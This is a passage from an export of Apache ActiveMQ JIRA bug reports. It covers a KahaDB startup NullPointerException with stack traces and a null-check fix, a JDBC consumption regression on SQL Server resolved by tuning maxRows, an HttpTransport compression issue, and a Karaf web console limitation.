value.,,sslavic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,112710,,,Wed Jan 04 10:23:40 UTC 2012,,,,,,,,,,,"0|i0ainr:",59296,,,,,,,,,,,,,,,,,,,,,"21/Oct/11 21:01;tabish;Fixed in trunk;;;","04/Jan/12 10:23;sslavic;Got hit by NPE in 5.5.0, when ActiveMQ starts and kahadb is corrupt:

{noformat}
2012-01-03 19:28:35,242 | INFO  | Corrupt journal records found in '/data/activemq_data/kahadb/db-1.log' between offsets: 0-1039496 | org.apache.kahadb.journal.Journal | WrapperSimpleAppMain
2012-01-03 19:28:35,682 | DEBUG | Page File: /data/activemq_data/kahadb/db.data, Recovering page file... | org.apache.kahadb.page.PageFile | WrapperSimpleAppMain
2012-01-03 19:28:35,694 | INFO  | KahaDB is version 3 | org.apache.activemq.store.kahadb.MessageDatabase | WrapperSimpleAppMain
2012-01-03 19:28:35,695 | DEBUG | loading | org.apache.kahadb.index.BTreeIndex | WrapperSimpleAppMain
2012-01-03 19:28:35,696 | ERROR | Failed to start ActiveMQ JMS Message Broker. Reason: java.io.EOFException | org.apache.activemq.broker.BrokerService | WrapperSimpleAppMain
java.io.EOFException
	at java.io.RandomAccessFile.readFully(Unknown Source)
	at java.io.RandomAccessFile.readFully(Unknown Source)
	at org.apache.kahadb.page.PageFile.readPage(PageFile.java:779)
	at org.apache.kahadb.page.Transaction.load(Transaction.java:411)
	at org.apache.kahadb.page.Transaction.load(Transaction.java:361)
	at org.apache.kahadb.index.BTreeIndex.load(BTreeIndex.java:159)
	at org.apache.activemq.store.kahadb.MessageDatabase$1.execute(MessageDatabase.java:255)
	at org.apache.kahadb.page.Transaction.execute(Transaction.java:728)
	at org.apache.activemq.store.kahadb.MessageDatabase.loadPageFile(MessageDatabase.java:236)
	at org.apache.activemq.store.kahadb.MessageDatabase.open(MessageDatabase.java:325)
	at org.apache.activemq.store.kahadb.MessageDatabase.load(MessageDatabase.java:374)
	at org.apache.activemq.store.kahadb.MessageDatabase.doStart(MessageDatabase.java:223)
	at org.apache.activemq.store.kahadb.KahaDBStore.doStart(KahaDBStore.java:180)
	at org.apache.activemq.util.ServiceSupport.start(ServiceSupport.java:53)
	at org.apache.activemq.store.kahadb.KahaDBPersistenceAdapter.start(KahaDBPersistenceAdapter.java:186)
	at org.apache.activemq.broker.BrokerService.start(BrokerService.java:493)
	at org.apache.activemq.xbean.XBeanBrokerService.afterPropertiesSet(XBeanBrokerService.java:60)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
	at java.lang.reflect.Method.invoke(Unknown Source)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeCustomInitMethod(AbstractAutowireCapableBeanFactory.java:1536)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1477)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1409)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:519)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:456)
	at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:291)
	at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)
	at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:288)
	at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:190)
	at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:574)
	at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:895)
	at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:425)
	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)
	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)
	at org.apache.activemq.xbean.XBeanBrokerFactory$1.<init>(XBeanBrokerFactory.java:114)
	at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:114)
	at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:70)
	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)
	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)
	at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:115)
	at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74)
	at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
	at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:143)
	at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
	at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:85)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
	at java.lang.reflect.Method.invoke(Unknown Source)
	at org.apache.activemq.console.Main.runTaskClass(Main.java:251)
	at org.apache.activemq.console.Main.main(Main.java:107)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
	at java.lang.reflect.Method.invoke(Unknown Source)
	at org.tanukisoftware.wrapper.WrapperSimpleApp.run(WrapperSimpleApp.java:240)
	at java.lang.Thread.run(Unknown Source)
2012-01-03 19:28:35,697 | INFO  | ActiveMQ Message Broker (localhost, null) is shutting down | org.apache.activemq.broker.BrokerService | WrapperSimpleAppMain
2012-01-03 19:28:35,697 | INFO  | Connector openwire Stopped | org.apache.activemq.broker.TransportConnector | WrapperSimpleAppMain
2012-01-03 19:28:35,699 | INFO  | PListStore:/usr/share/activemq/data/localhost/tmp_storage stopped | org.apache.activemq.store.kahadb.plist.PListStore | WrapperSimpleAppMain
2012-01-03 19:28:35,699 | INFO  | Stopping async queue tasks | org.apache.activemq.store.kahadb.KahaDBStore | WrapperSimpleAppMain
2012-01-03 19:28:35,699 | INFO  | Stopping async topic tasks | org.apache.activemq.store.kahadb.KahaDBStore | WrapperSimpleAppMain
2012-01-03 19:28:35,699 | INFO  | Stopped KahaDB | org.apache.activemq.store.kahadb.KahaDBStore | WrapperSimpleAppMain
2012-01-03 19:28:35,700 | DEBUG | Checkpoint started. | org.apache.activemq.store.kahadb.MessageDatabase | WrapperSimpleAppMain
2012-01-03 19:28:35,712 | ERROR | Could not stop service: org.apache.activemq.store.kahadb.KahaDBStore@36bf7916. Reason: java.lang.NullPointerException | org.apache.activemq.store.kahadb.KahaDBStore | WrapperSimpleAppMain
java.lang.NullPointerException
	at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:795)
	at org.apache.activemq.store.kahadb.MessageDatabase.checkpointProducerAudit(MessageDatabase.java:1289)
	at org.apache.activemq.store.kahadb.MessageDatabase.checkpointUpdate(MessageDatabase.java:1167)
	at org.apache.activemq.store.kahadb.MessageDatabase$4.execute(MessageDatabase.java:389)
	at org.apache.kahadb.page.Transaction.execute(Transaction.java:728)
	at org.apache.activemq.store.kahadb.MessageDatabase.close(MessageDatabase.java:387)
	at org.apache.activemq.store.kahadb.MessageDatabase.unload(MessageDatabase.java:422)
	at org.apache.activemq.store.kahadb.MessageDatabase.doStop(MessageDatabase.java:228)
	at org.apache.activemq.store.kahadb.KahaDBStore.doStop(KahaDBStore.java:247)
	at org.apache.activemq.util.ServiceSupport.stop(ServiceSupport.java:69)
	at org.apache.activemq.store.kahadb.KahaDBPersistenceAdapter.stop(KahaDBPersistenceAdapter.java:194)
	at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41)
	at org.apache.activemq.broker.BrokerService.stop(BrokerService.java:595)
	at org.apache.activemq.broker.BrokerService.start(BrokerService.java:539)
	at org.apache.activemq.xbean.XBeanBrokerService.afterPropertiesSet(XBeanBrokerService.java:60)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
	at java.lang.reflect.Method.invoke(Unknown Source)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeCustomInitMethod(AbstractAutowireCapableBeanFactory.java:1536)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1477)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1409)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:519)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:456)
	at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:291)
	at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)
	at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:288)
	at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:190)
	at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:574)
	at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:895)
	at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:425)
	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)
	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)
	at org.apache.activemq.xbean.XBeanBrokerFactory$1.<init>(XBeanBrokerFactory.java:114)
	at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:114)
	at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:70)
	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)
	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)
	at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:115)
	at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74)
	at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
	at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:143)
	at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
	at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:85)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
	at java.lang.reflect.Method.invoke(Unknown Source)
	at org.apache.activemq.console.Main.runTaskClass(Main.java:251)
	at org.apache.activemq.console.Main.main(Main.java:107)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
	at java.lang.reflect.Method.invoke(Unknown Source)
	at org.tanukisoftware.wrapper.WrapperSimpleApp.run(WrapperSimpleApp.java:240)
	at java.lang.Thread.run(Unknown Source)
2012-01-03 19:28:35,713 | ERROR | Could not stop service: KahaDBPersistenceAdapter[/data/activemq_data/kahadb]. Reason: java.lang.NullPointerException | org.apache.activemq.store.kahadb.KahaDBPersistenceAdapter | WrapperSimpleAppMain
java.lang.NullPointerException
	at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:795)
	at org.apache.activemq.store.kahadb.MessageDatabase.checkpointProducerAudit(MessageDatabase.java:1289)
	at org.apache.activemq.store.kahadb.MessageDatabase.checkpointUpdate(MessageDatabase.java:1167)
	at org.apache.activemq.store.kahadb.MessageDatabase$4.execute(MessageDatabase.java:389)
	at org.apache.kahadb.page.Transaction.execute(Transaction.java:728)
	at org.apache.activemq.store.kahadb.MessageDatabase.close(MessageDatabase.java:387)
	at org.apache.activemq.store.kahadb.MessageDatabase.unload(MessageDatabase.java:422)
	at org.apache.activemq.store.kahadb.MessageDatabase.doStop(MessageDatabase.java:228)
	at org.apache.activemq.store.kahadb.KahaDBStore.doStop(KahaDBStore.java:247)
	at org.apache.activemq.util.ServiceSupport.stop(ServiceSupport.java:69)
	at org.apache.activemq.store.kahadb.KahaDBPersistenceAdapter.stop(KahaDBPersistenceAdapter.java:194)
	at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41)
	at org.apache.activemq.broker.BrokerService.stop(BrokerService.java:595)
	at org.apache.activemq.broker.BrokerService.start(BrokerService.java:539)
	at org.apache.activemq.xbean.XBeanBrokerService.afterPropertiesSet(XBeanBrokerService.java:60)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
	at java.lang.reflect.Method.invoke(Unknown Source)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeCustomInitMethod(AbstractAutowireCapableBeanFactory.java:1536)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1477)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1409)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:519)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:456)
	at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:291)
	at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)
	at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:288)
	at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:190)
	at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:574)
	at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:895)
	at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:425)
	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)
	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)
	at org.apache.activemq.xbean.XBeanBrokerFactory$1.<init>(XBeanBrokerFactory.java:114)
	at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:114)
	at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:70)
	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)
	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)
	at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:115)
	at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74)
	at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
	at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:143)
	at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
	at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:85)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
	at java.lang.reflect.Method.invoke(Unknown Source)
	at org.apache.activemq.console.Main.runTaskClass(Main.java:251)
	at org.apache.activemq.console.Main.main(Main.java:107)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
	at java.lang.reflect.Method.invoke(Unknown Source)
	at org.tanukisoftware.wrapper.WrapperSimpleApp.run(WrapperSimpleApp.java:240)
	at java.lang.Thread.run(Unknown Source)
2012-01-03 19:28:35,720 | INFO  | ActiveMQ JMS Message Broker (localhost, null) stopped | org.apache.activemq.broker.BrokerService | WrapperSimpleAppMain
2012-01-03 19:28:35,720 | WARN  | Failed to stop broker after failure in start  | org.apache.activemq.broker.BrokerService | WrapperSimpleAppMain
java.lang.NullPointerException
	at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:795)
	at org.apache.activemq.store.kahadb.MessageDatabase.checkpointProducerAudit(MessageDatabase.java:1289)
	at org.apache.activemq.store.kahadb.MessageDatabase.checkpointUpdate(MessageDatabase.java:1167)
	at org.apache.activemq.store.kahadb.MessageDatabase$4.execute(MessageDatabase.java:389)
	at org.apache.kahadb.page.Transaction.execute(Transaction.java:728)
	at org.apache.activemq.store.kahadb.MessageDatabase.close(MessageDatabase.java:387)
	at org.apache.activemq.store.kahadb.MessageDatabase.unload(MessageDatabase.java:422)
	at org.apache.activemq.store.kahadb.MessageDatabase.doStop(MessageDatabase.java:228)
	at org.apache.activemq.store.kahadb.KahaDBStore.doStop(KahaDBStore.java:247)
	at org.apache.activemq.util.ServiceSupport.stop(ServiceSupport.java:69)
	at org.apache.activemq.store.kahadb.KahaDBPersistenceAdapter.stop(KahaDBPersistenceAdapter.java:194)
	at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41)
	at org.apache.activemq.broker.BrokerService.stop(BrokerService.java:595)
	at org.apache.activemq.broker.BrokerService.start(BrokerService.java:539)
	at org.apache.activemq.xbean.XBeanBrokerService.afterPropertiesSet(XBeanBrokerService.java:60)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
	at java.lang.reflect.Method.invoke(Unknown Source)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeCustomInitMethod(AbstractAutowireCapableBeanFactory.java:1536)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1477)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1409)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:519)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:456)
	at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:291)
	at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)
	at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:288)
	at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:190)
	at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:574)
	at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:895)
	at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:425)
	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)
	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)
	at org.apache.activemq.xbean.XBeanBrokerFactory$1.<init>(XBeanBrokerFactory.java:114)
	at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:114)
	at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:70)
	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)
	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)
	at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:115)
	at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74)
	at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
	at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:143)
	at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
	at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:85)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
	at java.lang.reflect.Method.invoke(Unknown Source)
	at org.apache.activemq.console.Main.runTaskClass(Main.java:251)
	at org.apache.activemq.console.Main.main(Main.java:107)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
	at java.lang.reflect.Method.invoke(Unknown Source)
	at org.tanukisoftware.wrapper.WrapperSimpleApp.run(WrapperSimpleApp.java:240)
	at java.lang.Thread.run(Unknown Source)
{noformat}

Line 795 in 5.5.0 version of org.apache.activemq.store.kahadb.MessageDatabase was
{code}
if (!checkpointThread.isAlive()) {
{code}
and after commits for AMQ-3559 that code is now
{code}
if (checkpointThread != null && !checkpointThread.isAlive()) {
{code}
which should resolve the NPE in this case as well.

AMQ-3634 will help with handling the case of corrupt kahadb. In other words, looking forward to 5.6.0 release.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Performance of consumption with JDBC persistance and Microsoft SQL Server,AMQ-3557,12528266,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,ravv,ravv,21/Oct/11 12:49,08/Nov/17 16:58,14/Jul/23 05:43,24/Aug/12 14:30,5.4.3,5.5.0,5.5.1,,,5.7.0,,,Message Store,Performance Test,,,0,jdbc,performance,sqlserver,,,,,,"We are trying to upgrade our ActiveMQ installation and have run into some performance issues. I'll attached our activemq.xml file to this bug.

I've setup a fresh SQLServer database for our upgrade tests and using the example Ant tools in the distribution, I've populated a persistent queue with 1,000,000 messages. I then consume those messages using the example Ant consumption script. The producing side works fine. However the performance of the consumption side is extremely poor. To consume just 10,000 of those messages takes over 5 minutes.

The consumer will pause for 4-5 seconds every 200 messages. This is easily visible in the output of the Ant script. We have also traced the DB to see what is happening there and have found that the findNextMessagesStatement takes 4-5 seconds every time it is executed. The statement's ID parameter is increased by 200 every time it is executed.  We also noticed the use of the ""SET ROWCOUNT 10000"" statement setting the maximum number of rows returned from a query at 10000. We also traced previous versions of ActiveMQ and found that SET ROWCOUNT was used much more often, with much smaller values (often 10, 20 or 30).

We have also tested the same setup with version 5.4.0 and did not have the same issues. Consumption speeds with 5.4.0 were normal, with no pauses. Version 5.4.3 did have the problem, however. So there seems to be a regression somewhere between 5.4.0 and 5.4.3 (also affects 5.5.0 and later).

Please let me know if you need more information, including the database traces.
","Microsoft SQL Server 2005, Debian Linux, ",gtully,ravv,tmielke,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"21/Oct/11 12:53;ravv;activemq.xml;https://issues.apache.org/jira/secure/attachment/12500173/activemq.xml",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,97626,,,Fri Aug 24 14:30:12 UTC 2012,,,,,,,,,,,"0|i0aio7:",59298,Regression,,,,,,,,,,,,,,,,,,,,"21/Oct/11 12:53;ravv;Configuration file we are using.;;;","17/Jul/12 09:55;tmielke;There was recently an improvement made to the JDBC persistence adapter to remove an unneeded synchronization point. See the last comment of AMQ-2868. This fix improves performance of the JDBC persistence adapter in case of using multiple consumers. 
;;;","20/Jul/12 15:23;gtully;https://fisheye6.atlassian.com/changelog/activemq?cs=1035202
seems to be the culprit but the use case is durable subs with a selector and low prefetch. Think that fix needs a revisit.
the maxRowSize should be a max, not a min. maxRowSize can be configured on the jdbcpersistnceadapter to set it to a more reasonable value like 400.
re durables, setting batch size based on prefetch should be avoided, probably.;;;","23/Jul/12 12:16;ravv;Setting maxRows=200 on the jdbcPersistenceAdapter looks like it solves the problem. My quick testing showed a normal consumption without any pauses. I will run some other tests to be sure, but so far it looks good.

I had seen the maxRows variable in the JDBC code, but was not aware that it could be set in the XML file. I might suggest that this be documented somewhere.

I might also suggest that the default value for maxRows be set to whatever the default batch size is. That is, AMQ/jdbcAdapter seems to process messages in batches of 200. Setting the default value of maxRows to be the same as this batch size (i.e. 200) would seem to make better sense as a default setting. I don't know all of the usecases, but setting this value to anything greater than the batch size would seem to make the DB do needless work.
;;;","24/Aug/12 14:17;gtully;The jdbc version of test: org.apache.activemq.usecases.DurableSubscriptionSelectorTest#testSubscription 
demonstrates the need to setMaxRows to a large value in the sparse selector case. Using a large destination page size via policy is a better solution as it is more specific.;;;","24/Aug/12 14:30;gtully;fix in http://svn.apache.org/viewvc?rev=1376934&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
HttpTransport not playing nice with Compression and sending TextMessage,AMQ-3556,12528009,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,tabish,tabish,20/Oct/11 19:21,20/Oct/11 19:23,14/Jul/23 05:43,20/Oct/11 19:23,5.x,,,,,5.6.0,,,Transport,,,,0,,,,,,,,,When sending or receiving messages with the HttpTransport and the UseCompression setting enabled on the ActiveMQConnectionFactory all messages are sent and received with Message bodies correctly compressed except for the TextMessage which is not sent with contents compressed (receipt does work).  The problem is that the XStreamWireFormat doesn't call beforeMarshall in its marshalText method for any MarshalAware commands that are sent (in the case of MessageDispatch it must do this on the inner Message object).  ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,95639,,,Thu Oct 20 19:23:34 UTC 2011,,,,,,,,,,,"0|i0aiof:",59299,,,,,,,,,,,,,,,,,,,,,"20/Oct/11 19:23;tabish;Fix applied in trunk along with a Test for send/receive over the HttpTransport with compression enabled. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Web console only allow usage of the web-console broker,AMQ-3553,12527993,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,jbonofre,jbonofre,20/Oct/11 18:01,02/Nov/13 22:18,14/Jul/23 05:43,02/Nov/13 22:18,5.5.0,,,,,5.9.0,,,Broker,,,,0,,,,,,,,,"Installing ActiveMQ WebConsole on Karaf (using features:install activemq-web-console) works fine, but:

- we can only administrate/monitore the web-console broker (using the WEB-INF/activemq.xml embedded file)
- creating a new broker using activemq:create looks to break the web console

